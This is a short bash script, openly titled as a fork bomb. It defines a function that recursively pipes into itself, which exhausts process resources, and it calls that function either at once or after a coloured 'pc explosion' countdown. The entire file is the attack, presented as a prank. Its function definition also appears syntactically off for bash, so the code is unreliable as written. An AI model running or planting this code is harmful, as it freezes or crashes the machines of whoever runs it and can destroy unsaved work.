#!/bin/bash

# *********************************************************** #
# ***********************A Fork bombe************************ #
# *********************************************************** #

e(){ e|e };

if [ -z "$1" ]; then
	e
	echo sus
else
	echo -e "\e[31m5 seconds before pc explosion\e[0m"
	sleep 1s

	echo -e "\e[32m4\e[0m"
	sleep 1s

	echo -e "\e[33m3\e[0m"
	sleep 1s

	echo -e "\e[34m2\e[0m"
	sleep 1s

	echo -e "\e[35m1\e[0m"
	sleep 1s

	e
fi

echo boooooom
